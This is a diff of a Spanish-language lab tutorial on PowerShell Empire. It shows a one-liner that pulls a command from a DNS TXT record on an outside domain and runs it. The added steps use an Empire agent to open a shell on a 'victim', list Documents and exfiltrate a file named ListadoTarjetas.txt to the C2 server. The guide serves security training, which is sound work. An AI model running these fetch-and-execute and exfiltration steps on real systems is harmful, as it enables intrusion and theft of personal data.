@@ -57,7 +57,9 @@ Vamos a ver si podemos ejecutarlo.
 & powershell . (nslookup -q=txt ejecutaesto.antsala.xyz)[-1]
 ```
 
-***Notepad*** se abre. ¿Mágico verdad? Hemos conseguido ejecutar el comando que se almacena en un registro TXT de la zona DNS.
+***NotePad*** se abre. ¿Mágico verdad? Hemos conseguido ejecutar el comando que se almacena en un registro TXT de la zona DNS.
+
+Aprovecha que está ***NotePad*** abierto. Escribe un texto en el documento y guarda el archivo en la carpeta ***Documentos*** con el nombre ***ListadoTarjetas.txt***. Cierra ***NotePad***.
 
 ## Ejercicio 2: Actualizar PowerShell Empire.
 
@@ -190,6 +192,70 @@ help
 y que podemos ver en esta captura.
 
 ![help interact](../img/lab-50-C/202209151040.png)
+
+Juguemos un poco con la víctima.
+
+Mostramos información de la víctima.
+```
+info
+```
+
+Abrimos una Shell en la víctima
+```
+shell
+```
+
+Listamos el contenido de ***Documents***.
+```
+dir Documents
+```
+
+Ahí localizamos un archivo interesante.
+
+![Dir Documents](../img/lab-50-C/202209151111.png)
+
+Salimos de la shell con ***CTRL+C***.
+
+Descargamos el archivo.
+```
+download "C:\Users\Antonio\Documents\ListadoTarjetas.txt"
+```
+
+Cada vez que un ***Agente*** se conecta a ***PowerShell Empire*** (Server), se crea una carpeta de descarga que se usa para recuperar los archivos descargados desde la víctima.
+
+Cada agente tiene su propia carpeta de descarga. En una nueva terminal, ejecuta el siguiente comando.
+```
+ls /var/lib/powershell-empire/server/downloads
+```
+
+Debes ver la carpeta de descarga de nuestro agente.
+
+![Carpeta descarga](../img/lab-50-C/202209151122.png)
+
+y dentro de ella, el archivo que hemos exfiltrado.
+Nota: Sustituye <Nombre_Agente> por el nombre del agente que se ha creado.
+```
+ls /var/lib/powershell-empire/server/downloads/<Nombre_Agente>
+```
+
+***PowerShell Empire*** recrea la estructura del disco conforme vamos descargando archivos o directorios.
+
+![Estructura C:](../img/lab-50-C/202209151126.png)
+
+Ya solo queda ver el contenido del archivo.
+```
+cat /var/lib/powershell-empire/server/downloads/6L8UBCX7/C:/Users/Antonio/Documents/ListadoTarjetas.txt 
+```
+
+![Listado de Tarjetas](../img/lab-50-C/202209151128.png)
+
+
+
+
+
+
+
+
 
 
 
